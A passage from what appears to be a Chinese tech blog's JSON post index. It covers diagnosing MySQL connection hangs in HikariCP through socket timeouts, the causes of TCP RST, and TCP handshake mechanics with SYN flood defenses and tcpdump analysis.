connectionbag，连接对象容器，存放当前的连接对象列表，用于提供可用连接。 addconnectionexecutor，添加连接的执行器，命名如 “hikaripool-1 connection adder”，是一个单线程的线程池。 poolentrycreator，添加连接的任务，实现创建连接的具体逻辑。 housekeeper，内部定时器，用于实现连接的超时淘汰、连接池的补充等工作。 housekeeper 在连接池初始化后的 100ms 触发执行，其调用 fillpool() 方法完成连接池的填充，例如 min-idle 是10，那么初始化就会创建10个连接。connectionbag 维护了当前连接对象的列表，该模块还维护了请求连接者(waiters)的一个计数器，用于评估当前连接数的需求。其中，borrow 方法的逻辑如下： 123456789101112131415161718192021222324252627282930313233343536373839404142public t borrow(long timeout, final timeunit timeunit) throws interruptedexception &#123; // 尝试从 thread-local 中获取 final list&lt;object&gt; list = threadlist.get(); for (int i = list.size() - 1; i &gt;= 0; i--) &#123; ... &#125; // 计算当前等待请求的任务 final int waiting = waiters.incrementandget(); try &#123; for (t bagentry : sharedlist) &#123; if (bagentry.compareandset(state_not_in_use, state_in_use)) &#123; //如果获得了可用连接，会触发填充任务 if (waiting &gt; 1) &#123; listener.addbagitem(waiting - 1); &#125; return bagentry; &#125; &#125; //没有可用连接，先触发填充任务 listener.addbagitem(waiting); //在指定时间内等待可用连接进入 timeout = timeunit.tonanos(timeout); do &#123; final long start = currenttime(); final t bagentry = handoffqueue.poll(timeout, nanoseconds); if (bagentry == null || bagentry.compareandset(state_not_in_use, state_in_use)) &#123; return bagentry; &#125; timeout -= elapsednanos(start); &#125; while (timeout &gt; 10_000); return null; &#125; finally &#123; waiters.decrementandget(); &#125; &#125; 注意到，无论是有没有可用连接，该方法都会触发一个 listener.addbagitem() 方法，hikaripool 对该接口的实现如下： 1234567891011121314151617181920212223242526272829303132333435363738public void addbagitem(final int waiting) &#123; final boolean shouldadd = waiting - addconnectionqueuereadonlyview.size() &gt;= 0; // yes, &gt;= is intentional. if (shouldadd) &#123; //调用 addconnectionexecutor 提交创建连接的任务 addconnectionexecutor.submit(poolentrycreator); &#125; else &#123; logger.debug(&quot;&#123;&#125; - add connection elided, waiting &#123;&#125;, queue &#123;&#125;&quot;, poolname, waiting, addconnectionqueuereadonlyview.size()); &#125; &#125;poolentrycreator 则实现了创建连接的具体逻辑，如下：public class poolentrycreator&#123; @override public boolean call() &#123; long sleepbackoff = 250l; //判断是否需要建立连接 while (poolstate == pool_normal &amp;&amp; shouldcreateanotherconnection()) &#123; //创建 mysql 连接 final poolentry poolentry = createpoolentry(); if (poolentry != null) &#123; //建立连接成功，直接返回。 connectionbag.add(poolentry); logger.debug(&quot;&#123;&#125; - added connection &#123;&#125;&quot;, poolname, poolentry.connection); if (loggingprefix != null) &#123; logpoolstate(loggingprefix); &#125; return boolean.true; &#125; ... &#125; // pool is suspended or shutdown or at max size return boolean.false; &#125;&#125; 由此可见，addconnectionexecutor 采用了单线程的设计，当产生新连接需求时，会异步触发 poolentrycreator 任务进行补充。其中 poolentrycreator. createpoolentry() 会完成 mysql 驱动连接建立的所有事情，而我们的情况则恰恰是mysql 建链过程产生了永久性阻塞。因此无论后面怎么获取连接，新来的建链任务都会一直排队等待，这便导致了业务上一直没有连接可用。 下面这个图说明了 hikaricp 的建链过程： 好了，让我们在回顾一下前面关于可靠性测试的场景：首先，mysql 主实例发生故障，而紧接着 hikaricp 则检测到了坏的连接(connection is dead)并将其释放，在释放关闭连接的同时又发现连接数需要补充，进而立即触发了新的建链请求。而问题就刚好出在这一次建链请求上，tcp 握手的部分是成功了（客户端和 mysql vm 上 nodeport 完成连接），但在接下来由于当前的 mysql 容器已经停止（此时 vip 也切换到了另一台 mysql 实例上），因此客户端再也无法获得原 mysql 实例的握手包响应（该握手属于mysql应用层的协议），此时便陷入了长时间的阻塞式 socketread 操作。而建链请求任务恰恰好采用了单线程运作，进一步则导致了所有业务的阻塞。 3.解决方案在了解了事情的来龙去脉之后，我们主要考虑从两方面进行优化： 优化一，增加 hirakipool 中 addconnectionexecutor 线程的数量，这样即使第一个线程出现挂死，还有其他的线程能参与建链任务的分配。 优化二，出问题的 socketread 是一种同步阻塞式的调用，可通过 so_timeout 来避免长时间挂死。 对于优化点一，我们一致认为用处并不大，如果连接出现了挂死那么相当于线程资源已经泄露，对服务后续的稳定运行十分不利，而且 hikaricp 在这里也已经将其写死了。因此关键的方案还是避免阻塞式的调用。查阅了 mariadb-java-client 官方文档后，发现可以在 jdbc url 中指定网络io 的超时参数，如下：具体参考：https://mariadb.com/kb/en/about-mariadb-connector-j/如描述所说的，sockettimeout 可以设置 socket 的 so_timeout 属性，从而达到控制超时时间的目的。默认是 0，即不超时。我们在 mysql jdbc url 中加入了相关的参数，如下： 12 spring.datasource.url=jdbc:mysql://10.0.71.13:33052/appdb?sockettimeout=60000&amp;connecttimeout=30000&amp;servertimezone=utc 此后对 mysql 可靠性场景进行多次验证，发现连接挂死的现象已经不再出现，此时问题得到解决。 3.1 解决示例 未开启timeout 1jdbc:mysql://testdb.com:3306/app000000?useUnicode=yes&amp;charset=utf8mb4&amp;collation=utf8mb4_general_ci 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152wuhaocn-rongcloud-macbook:web-app wuhao$ jstack 72303 2022-04-29 11:21:53Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.231-b11 mixed mode):&quot;Attach Listener&quot; #88 daemon prio=9 os_prio=31 tid=0x00007f819d97b000 nid=0x9777 waiting on condition [0x0000000000000000] java.lang.Thread.State: RUNNABLE&quot;HikariPool-2 housekeeper&quot; #47 daemon prio=5 os_prio=31 tid=0x00007f819802c000 nid=0x8503 waiting on condition [0x000070000e329000] java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x000000074067e0a8&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078) at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093) at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)&quot;db_pool_factory_0&quot; #46 prio=5 os_prio=31 tid=0x00007f8199156800 nid=0x8803 waiting on condition [0x000070000e226000] java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x00000007401f6558&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039) at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)&quot;HikariPool-1 housekeeper&quot; #43 daemon prio=5 os_prio=31 tid=0x00007f8196c4d000 nid=0x8b03 waiting on condition [0x000070000df1d000] java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x000000074067e288&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078) at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093) at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)&quot;Abandoned connection cleanup thread&quot; #42 daemon prio=5 os_prio=31 tid=0x00007f81962dd000 nid=0x7203 in Object.wait() [0x000070000de1a000] java.lang.Thread.State: TIMED_WAITING (on object monitor) at java.lang.Object.wait(Native Method) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144) - locked &lt;0x00000007401f5ae8&gt; (a java.lang.ref.ReferenceQueue$Lock) at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:41) 开启timeout 1jdbc:mysql://testdb.com:3306/app000000?sockettimeout=60000&amp;connecttimeout=30000&amp;useUnicode=yes&amp;charset=utf8mb4&amp;collation=utf8mb4_general_ci 4.小结本次分享了一次关于 mysql 连接挂死问题排查的心路历程，由于环境搭建的工作量巨大，而且该问题复现存在偶然性，整个分析过程还是有些坎坷的（其中也踩了坑）。的确，我们很容易被一些表面的现象所迷惑，而觉得问题很难解决时，更容易带着偏向性思维去处理问题。例如本例中曾一致认为连接池出现了问题，但实际上却是由于 mysql jdbc 驱动（mariadb driver）的一个不严谨的配置所导致。从原则上讲，应该避免一切可能导致资源挂死的行为。如果我们能在前期对代码及相关配置做好充分的排查工作，相信 996 就会离我们越来越远。以上就是详解mysql连接挂死的原因的详细内容，更多关于mysql连接挂死的原因的资料请关注服务器之家其它相关文章！ 5.参考详解MySQL连接挂死的原因","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://wuhaocn.github.io/tags/MySQL/"}]},{"title":"TCP状态概述.md","slug":"network/protocol/tcp/TCP状态概述","date":"2023-11-15T03:40:25.016Z","updated":"2023-11-15T03:40:25.016Z","comments":true,"path":"2023/11/15/network/protocol/tcp/TCP状态概述/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/tcp/TCP%E7%8A%B6%E6%80%81%E6%A6%82%E8%BF%B0/","excerpt":"","text":"RST产生的原因原因概述正常情况tcp四层握手关闭连接，rst基本都是异常情况，整理如下： GFW 对方端口未打开，发生在连接建立 如果端口打开，只是sync_backlog满了的话，sync简单被丢弃，表现为超时，而不会rst。 Close Socket 时recv buffer 不为空 例如，客户端发了两个请求，服务器只从buffer 读取第一个请求处理完就关闭连接，tcp层认为数据没有正确提交到应用，使用rst关闭连接。 移动链路 移动网络下，国内是有5分钟后就回收信令，也就是IM产品，如果心跳&gt;5分钟后服务器再给客户端发消息，就会收到rst。也要查移动网络下IM 保持&lt;5min 心跳。 负载等设备 负载设备需要维护连接转发策略，长时间无流量，连接也会被清除，而且很多都不告诉两层机器，新的包过来时才通告rst。 Apple Push 服务也有这个问题，而且是不可预期的偶发性连接被rst；rst 前第一个消息write 是成功的，而第二条写才会告诉你连接被重置， 曾经被它折腾没辙，因此打开每2秒一次tcp keepalive，固定5分钟tcp连接回收，而且发现连接出错时，重发之前10s内消息。 SO_LINGER 同第三条，默认SO_LINGER选项关闭， 直接丢弃未发送完毕的send buffer，并发送rst，业务上表示为对端数据未收到； 建议打开，但在linger time 内仍然未将buffer发送完，那依然发送rst。 好像曾经测试过haproxy 某种配置下，会使用rst关闭连接，少了网络交互而且没有 TIME_WAIT 问题 超过超时重传次数、网络暂时不可达 TIME_WAIT 状态tw_recycle = 1 时，sync timestamps 比上次小时，会被rst 设置 connect_timeout应用设置了连接超时，sync 未完成时超时了，会发送rst终止连接。 非正常包 连接已经关闭，seq 不正确等 keepalive 超时公网服务tcp keepalive 最好别打开；移动网络下会增加网络负担，切容易掉线；非移动网络核心ISP设备也不一定都支持keepalive，曾经也发现过广州那边有个核心节点就不支持。 实例分析 业务表现：业务监控偶现超时，客户端连接服务端偶现被掐掉连接（服务端返回fin） 网络链路：lb1-&gt;nginx-&gt;lb2-&gt;服务 问题分析 查询nginx日志及监控正常 查询服务日志及监控正常 业务量变化：前一天出现一波业务高峰，现状观察服务水位线处于安全水位 根据现有状态未发现明显问题 现场复现 模拟请求 发现客户端已经发到平台但没有到服务器，出现部分请求丢失 进行链路抓包 发现lb2分别给nginx及服务发了rst 经过排查定位到lb2超时时间设置过长造成连接未及时清理 缩短超时时间即可","categories":[{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/categories/TCP/"}],"tags":[{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/tags/TCP/"}]},{"title":"TCP的3次握手与4次挥手简介","slug":"network/protocol/tcp/TCP的3次握手与4次挥手详解","date":"2023-11-15T03:40:25.016Z","updated":"2023-11-15T03:40:25.016Z","comments":true,"path":"2023/11/15/network/protocol/tcp/TCP的3次握手与4次挥手详解/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/tcp/TCP%E7%9A%843%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E4%E6%AC%A1%E6%8C%A5%E6%89%8B%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"TCP的3次握手与4次挥手简介TCP是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如ip地址、端口号等。TCP可以看成是一种字节流，它会处理IP层或以下的层的丢包、重复以及错误问题。在连接的建立过程中，双方需要交换一些连接的参数。这些参数可以放在TCP头部。TCP提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接。采用4次挥手来关闭一个连接。 TCP服务模型在了解了建立连接、关闭连接的“三次握手和四次挥手”后，我们再来看下TCP相关的东西。一个TCP连接由一个4元组构成，分别是两个IP地址和两个端口号。一个TCP连接通常分为三个阶段：启动、数据传输、退出（关闭）。当TCP接收到另一端的数据时，它会发送一个确认，但这个确认不会立即发送，一般会延迟一会儿。ACK是累积的，一个确认字节号N的ACK表示所有直到N的字节（不包括N）已经成功被接收了。这样的好处是如果一个ACK丢失，很可能后续的ACK就足以确认前面的报文段了。一个完整的TCP连接是双向和对称的，数据可以在两个方向上平等地流动。给上层应用程序提供一种双工服务。一旦建立了一个连接，这个连接的一个方向上的每个TCP报文段都包含了相反方向上的报文段的一个ACK。序列号的作用是使得一个TCP接收端可丢弃重复的报文段，记录以杂乱次序到达的报文段。因为TCP使用IP来传输报文段，而IP不提供重复消除或者保证次序正确的功能。另一方面，TCP是一个字节流协议，绝不会以杂乱的次序给上层程序发送数据。因此TCP接收端会被迫先保持大序列号的数据不交给应用程序，直到缺失的小序列号的报文段被填满。 TCP头部源端口和目的端口在TCP层确定双方进程，序列号表示的是报文段数据中的第一个字节号，ACK表示确认号，该确认号的发送方期待接收的下一个序列号，即最后被成功接收的数据字节序列号加1，这个字段只有在ACK位被启用的时候才有效。当新建一个连接时，从客户端发送到服务端的第一个报文段的SYN位被启用，这称为SYN报文段，这时序列号字段包含了在本次连接的这个方向上要使用的第一个序列号，即初始序列号ISN，之后发送的数据是ISN加1，因此SYN位字段会消耗一个序列号，这意味着使用重传进行可靠传输。而不消耗序列号的ACK则不是。头部长度（图中的数据偏移）以32位字为单位，也就是以4bytes为单位，它只有4位，最大为15，因此头部最大长度为60字节，而其最小为5，也就是头部最小为20字节（可变选项为空）。ACK —— 确认，使得确认号有效。 RST —— 重置连接（经常看到的reset by peer）就是此字段搞的鬼。 SYN —— 用于初如化一个连接的序列号。FIN —— 该报文段的发送方已经结束向对方发送数据。当一个连接被建立或被终止时，交换的报文段只包含TCP头部，而没有数据。 状态转换三次握手和四次挥手的状态转换如下图。 为什么要“三次握手，四次挥手”三次握手换个易于理解的视角来看为什么要3次握手。客户端和服务端通信前要进行连接，“3次握手”的作用就是双方都能明确自己和对方的收、发能力是正常的。第一次握手：客户端发送网络包，服务端收到了。这样服务端就能得出结论：客户端的发送能力、服务端的接收能力是正常的。第二次握手：服务端发包，客户端收到了。这样客户端就能得出结论：服务端的接收、发送能力，客户端的接收、发送能力是正常的。从客户端的视角来看，我接到了服务端发送过来的响应数据包，说明服务端接收到了我在第一次握手时发送的网络包，并且成功发送了响应数据包，这就说明，服务端的接收、发送能力正常。而另一方面，我收到了服务端的响应数据包，说明我第一次发送的网络包成功到达服务端，这样，我自己的发送和接收能力也是正常的。第三次握手：客户端发包，服务端收到了。这样服务端就能得出结论：客户端的接收、发送能力，服务端的发送、接收能力是正常的。第一、二次握手后，服务端并不知道客户端的接收能力以及自己的发送能力是否正常。而在第三次握手时，服务端收到了客户端对第二次握手作的回应。从服务端的角度，我在第二次握手时的响应数据发送出去了，客户端接收到了。所以，我的发送能力是正常的。而客户端的接收能力也是正常的。经历了上面的三次握手过程，客户端和服务端都确认了自己的接收、发送能力是正常的。之后就可以正常通信了。每次都是接收到数据包的一方可以得到一些结论，发送的一方其实没有任何头绪。我虽然有发包的动作，但是我怎么知道我有没有发出去，而对方有没有接收到呢？而从上面的过程可以看到，最少是需要三次握手过程的。两次达不到让双方都得出自己、对方的接收、发送能力都正常的结论。其实每次收到网络包的一方至少是可以得到：对方的发送、我方的接收是正常的。而每一步都是有关联的，下一次的“响应”是由于第一次的“请求”触发，因此每次握手其实是可以得到额外的结论的。比如第三次握手时，服务端收到数据包，表明看服务端只能得到客户端的发送能力、服务端的接收能力是正常的，但是结合第二次，说明服务端在第二次发送的响应包，客户端接收到了，并且作出了响应，从而得到额外的结论：客户端的接收、服务端的发送是正常的。用表格总结一下： 四次挥手TCP连接是双向传输的对等的模式，就是说双方都可以同时向对方发送或接收数据。当有一方要关闭连接时，会发送指令告知对方，我要关闭连接了。这时对方会回一个ACK，此时一个方向的连接关闭。但是另一个方向仍然可以继续传输数据，等到发送完了所有的数据后，会发送一个FIN段来关闭此方向上的连接。接收方发送ACK确认关闭连接。注意，接收到FIN报文的一方只能回复一个ACK,它是无法马上返回对方一个FIN报文段的，因为结束数据传输的“指令”是上层应用层给出的，我只是一个“搬运工”，我无法了解“上层的意志”。 “三次握手，四次挥手”怎么完成？其实3次握手的目的并不只是让通信双方都了解到一个连接正在建立，还在于利用数据包的选项来传输特殊的信息，交换初始序列号ISN。3次握手是指发送了3个报文段，4次挥手是指发送了4个报文段。注意，SYN和FIN段都是会利用重传进行可靠传输的。 三次握手 客户端发送一个SYN段，并指明客户端的初始序列号，即ISN(c). 服务端发送自己的SYN段作为应答，同样指明自己的ISN(s)。为了确认客户端的SYN，将ISN(c)+1作为ACK数值。这样，每发送一个SYN，序列号就会加1.如果有丢失的情况，则会重传。 为了确认服务器端的SYN，客户端将ISN(s)+1作为返回的ACK数值。 四次挥手 客户端发送一个FIN段，并包含一个希望接收者看到的自己当前的序列号K. 同时还包含一个ACK表示确认对方最近一次发过来的数据。 服务端将K值加1作为ACK序号值，表明收到了上一个包。这时上层的应用程序会被告知另一端发起了关闭操作，通常这将引起应用程序发起自己的关闭操作。 服务端发起自己的FIN段，ACK=K+1, Seq=L 客户端确认。ACK=L+1 为什么建立连接是三次握手，而关闭连接却是四次挥手呢？这是因为服务端在LISTEN状态下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。而关闭连接时，当收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据，己方是否现在关闭发送数据通道，需要上层应用来决定，因此，己方ACK和FIN一般都会分开发送。 “三次握手，四次挥手”进阶ISN三次握手的一个重要功能是客户端和服务端交换ISN(Initial Sequence Number), 以便让对方知道接下来接收数据的时候如何按序列号组装数据。如果ISN是固定的，攻击者很容易猜出后续的确认号。ISN = M + F(localhost, localport, remotehost, remoteport)M是一个计时器，每隔4毫秒加1。 F是一个Hash算法，根据源IP、目的IP、源端口、目的端口生成一个随机数值。要保证hash算法不能被外部轻易推算得出。 序列号回绕因为ISN是随机的，所以序列号容易就会超过2^31-1. 而tcp对于丢包和乱序等问题的判断都是依赖于序列号大小比较的。此时就出现了所谓的tcp序列号回绕（sequencewraparound）问题。怎么解决？ 12345678910/** The next routines deal with comparing 32 bit unsigned ints* and worry about wraparound (automatic with unsigned arithmetic).*/static inline int before(__u32 seq1, __u32 seq2)&#123; return (__s32)(seq1-seq2) &lt; 0;&#125;#define after(seq2, seq1) before(seq1, seq2) 上述代码是内核中的解决回绕问题代码。s32是有符号整型的意思，而u32则是无符号整型。序列号发生回绕后，序列号变小，相减之后，把结果变成有符号数了，因此结果成了负数。 1234567891011121314假设seq1=255， seq2=1（发生了回绕）。seq1 = 1111 1111 seq2 = 0000 0001我们希望比较结果是 seq1 - seq2= 1111 1111-0000 0001----------- 1111 1110由于我们将结果转化成了有符号数，由于最高位是1，因此结果是一个负数，负数的绝对值为 0000 0001 + 1 = 0000 0010 = 2因此seq1 - seq2 &lt; 0 syn flood攻击最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。syn flood属于Dos攻击的一种。如果恶意的向某个服务器端口发送大量的SYN包，则可以使服务器打开大量的半开连接，分配TCB（Transmission Control Block）,从而消耗大量的服务器资源，同时也使得正常的连接请求无法被相应。当开放了一个TCP端口后，该端口就处于Listening状态，不停地监视发到该端口的Syn报文，一旦接收到Client发来的Syn报文，就需要为该请求分配一个TCB，通常一个TCB至少需要280个字节，在某些操作系统中TCB甚至需要1300个字节，并返回一个SYNACK命令，立即转为SYN-RECEIVED即半开连接状态。系统会为此耗尽资源。常见的防攻击方法有： 无效连接的监视释放监视系统的半开连接和不活动连接，当达到一定阈值时拆除这些连接，从而释放系统资源。这种方法对于所有的连接一视同仁，而且由于SYNFlood造成的半开连接数量很大，正常连接请求也被淹没在其中被这种方式误释放掉，因此这种方法属于入门级的SYN Flood方法。 延缓TCB分配方法消耗服务器资源主要是因为当SYN数据报文一到达，系统立即分配TCB，从而占用了资源。而SYNFlood由于很难建立起正常连接，因此，当正常连接建立起来后再分配TCB则可以有效地减轻服务器资源的消耗。常见的方法是使用SynCache和Syn Cookie技术。 Syn Cache技术系统在收到一个SYN报文时，在一个专用HASH表中保存这种半连接信息，直到收到正确的回应ACK报文再分配TCB。这个开销远小于TCB的开销。当然还需要保存序列号。 Syn Cookie技术Syn Cookie技术则完全不使用任何存储资源，这种方法比较巧妙，它使用一种特殊的算法生成SequenceNumber，这种算法考虑到了对方的IP、端口、己方IP、端口的固定信息，以及对方无法知道而己方比较固定的一些信息，如MSS(MaximumSegment Size，最大报文段大小，指的是TCP报文的最大数据报长度，其中不包括TCP首部长度。)、时间等，在收到对方的ACK报文后，重新计算一遍，看其是否与对方回应报文中的（Sequence Number-1）相同，从而决定是否分配TCB资源。 使用SYN Proxy防火墙一种方式是防止墙dqywb连接的有效性后，防火墙才会向内部服务器发起SYN请求。防火墙代服务器发出的SYN ACK包使用的序列号为c,而真正的服务器回应的序列号为c’, 这样，在每个数据报文经过防火墙的时候进行序列号的修改。另一种方式是防火墙确定了连接的安全后，会发出一个safereset命令，client会进行重新连接，这时出现的syn报文会直接放行。这样不需要修改序列号了。但是，client需要发起两次握手过程，因此建立连接的时间将会延长。 连接队列在外部请求到达时，被服务程序最终感知到前，连接可能处于SYN_RCVD状态或是ESTABLISHED状态，但还未被应用程序接受。 对应地，服务器端也会维护两种队列，处于SYN_RCVD状态的半连接队列，而处于ESTABLISHED状态但仍未被应用程序accept的为全连接队列。如果这两个队列满了之后，就会出现各种丢包的情形。查看是否有连接溢出 netstat -s | grep LISTEN 半连接队列满了在三次握手协议中，服务器维护一个半连接队列，该队列为每个客户端的SYN包开设一个条目(服务端在接收到SYN包的时候，就已经创建了request_sock结构，存储在半连接队列中)，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。目前，Linux下默认会进行5次重发SYN-ACK包，重试的间隔时间从1s开始，下次的重试间隔时间是前一次的双倍，5次的重试时间间隔为1s,2s, 4s, 8s, 16s, 总共31s, 称为指数退避，第5次发出后还要等32s才知道第5次也超时了，所以，总共需要 1s + 2s + 4s+ 8s+ 16s +32s = 63s,TCP才会把断开这个连接。由于，SYN超时需要63秒，那么就给攻击者一个攻击服务器的机会，攻击者在短时间内发送大量的SYN包给Server(俗称SYN flood攻击)，用于耗尽Server的SYN队列。对于应对SYN过多的问题，linux提供了几个TCP参数：tcp_syncookies、tcp_synack_retries、tcp_max_syn_backlog、tcp_abort_on_overflow 来调整应对。 全连接队列满当第三次握手时，当server接收到ACK包之后，会进入一个新的叫 accept 的队列。当accept队列满了之后，即使client继续向server发送ACK的包，也会不被响应，此时ListenOverflows+1，同时server通过tcp_abort_on_overflow来决定如何返回，0表示直接丢弃该ACK，1表示发送RST通知client；相应的，client则会分别返回readtimeout 或者 connection reset bypeer。另外，tcp_abort_on_overflow是0的话，server过一段时间再次发送syn+ack给client（也就是重新走握手的第二步），如果client超时等待比较短，就很容易异常了。而客户端收到多个SYN ACK 包，则会认为之前的 ACK 丢包了。于是促使客户端再次发送 ACK ，在 accept队列有空闲的时候最终完成连接。若accept队列始终满员，则最终客户端收到 RST 包（此时服务端发送syn+ack的次数超出了tcp_synack_retries）。服务端仅仅只是创建一个定时器，以固定间隔重传syn和ack到服务端 命令netstat -s命令[root@server ~]# netstat -s | egrep “listen|LISTEN” 667399 times the listen queue of a socket overflowed 667399 SYNs toLISTEN sockets ignored比如上面看到的 667399 times ，表示全连接队列溢出的次数，隔几秒钟执行下，如果这个数字一直在增加的话肯定全连接队列偶尔满了。[root@server ~]# netstat -s | grep TCPBacklogDrop 查看 Accept queue 是否有溢出 ss命令[root@server ~]# ss -lnt State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 _:6379 : LISTEN 0128 _:22 : 如果State是listen状态，Send-Q 表示第三列的listen端口上的全连接队列最大为50，第一列Recv-Q为全连接队列当前使用了多少。非 LISTEN 状态中 Recv-Q 表示 receive queue 中的 bytes 数量；Send-Q 表示 send queue 中的 bytes 数值。 小结当外部连接请求到来时，TCP模块会首先查看max_syn_backlog，如果处于SYN_RCVD状态的连接数目超过这一阈值，进入的连接会被拒绝。根据tcp_abort_on_overflow字段来决定是直接丢弃，还是直接reset.从服务端来说，三次握手中，第一步server接受到client的syn后，把相关信息放到半连接队列中，同时回复syn+ack给client.第三步当收到客户端的ack, 将连接加入到全连接队列。一般，全连接队列比较小，会先满，此时半连接队列还没满。如果这时收到syn报文，则会进入半连接队列，没有问题。但是如果收到了三次握手中的第3步(ACK)，则会根据tcp_abort_on_overflow字段来决定是直接丢弃，还是直接reset.此时，客户端发送了ACK,那么客户端认为三次握手完成，它认为服务端已经准备好了接收数据的准备。但此时服务端可能因为全连接队列满了而无法将连接放入，会重新发送第2步的syn+ack,如果这时有数据到来，服务器TCP模块会将数据存入队列中。一段时间后，client端没收到回复，超时，连接异常，client会主动关闭连接。 “三次握手，四次挥手”redis实例分析 我在dev机器上部署redis服务，端口号为6379, 通过tcpdump工具获取数据包，使用如下命令 tcpdump -w /tmp/a.cap port 6379 -s0 -w把数据写入文件，-s0设置每个数据包的大小默认为68字节，如果用-S 0则会抓到完整数据包 在dev2机器上用redis-cli访问dev:6379, 发送一个ping, 得到回复pong 停止抓包，用tcpdump读取捕获到的数据包 tcpdump -r /tmp/a.cap -n -nn -A -x| vim - （-x 以16进制形式展示，便于后面分析）共收到了7个包。抓到的是IP数据包，IP数据包分为IP头部和IP数据部分，IP数据部分是TCP头部加TCP数据部分。IP的数据格式为：它由固定长度20B+可变长度构成。10:55:45.662077 IP dev2.39070 &gt; dev.6379: Flags [S], seq 4133153791, win 29200,options [mss 1460,sackOK,TS val 2959270704 ecr 0,nop,wscale 7], length 0 0x0000: 4500 003c 08cf 4000 3606 14a5 0ab3b561 0x0010: 0a60 5cd4 989e 18eb f65a ebff 0000 0000 0x0020: a002 7210 872f 0000 0204 05b4 0402 080a 0x0030: b062e330 0000 0000 0103 0307对着IP头部格式，来拆解数据包的具体含义。剩余的数据部分即为TCP协议相关的。TCP也是20B固定长度+可变长度部分。可变长度部分，协议如下：这样第一个包分析完了。dev2向dev发送SYN请求。也就是三次握手中的第一次了。 SYN seq(c)=4133153791第二个包，dev响应连接，ack=4133153792. 表明dev下次准备接收这个序号的包，用于tcp字节注的顺序控制。dev（也就是server端）的初始序号为seq=4264776963,syn=1. SYN ack=seq(c)+1 seq(s)=4264776963第三个包，client包确认，这里使用了相对值应答。seq=4133153792, 等于第二个包的ack. ack=4264776964. ack=seq(s)+1, seq=seq(c)+1至此，三次握手完成。接下来就是发送ping和pong的数据了。接着第四个包。 12345610:55:48.090073 IP dev2.39070 &gt; dev.6379: Flags [P.], seq 1:15, ack 1, win 229, options [nop,nop,TS val 2959273132 ecr 3132256230], length 14 0x0000: 4500 0042 08d1 4000 3606 149d 0ab3 b561 0x0010: 0a60 5cd4 989e 18eb f65a ec00 fe33 5504 0x0020: 8018 00e5 4b5f 0000 0101 080a b062 ecac 0x0030: bab2 6fe6 2a31 0d0a 2434 0d0a 7069 6e67 0x0040: 0d0a tcp首部长度为32B, 可选长度为12B. IP报文的总长度为66B, 首部长度为20B, 因此TCP数据部分长度为14B. seq=0xf65aec00=4133153792 ACK, PSH. 数据部分为2a31 0d0a 2434 0d0a 7069 6e67 0d0a 1234560x2a31 -&gt; *10x0d0a -&gt; \\r\\n0x2434 -&gt; $40x0d0a -&gt; \\r\\n0x7069 0x6e67 -&gt; 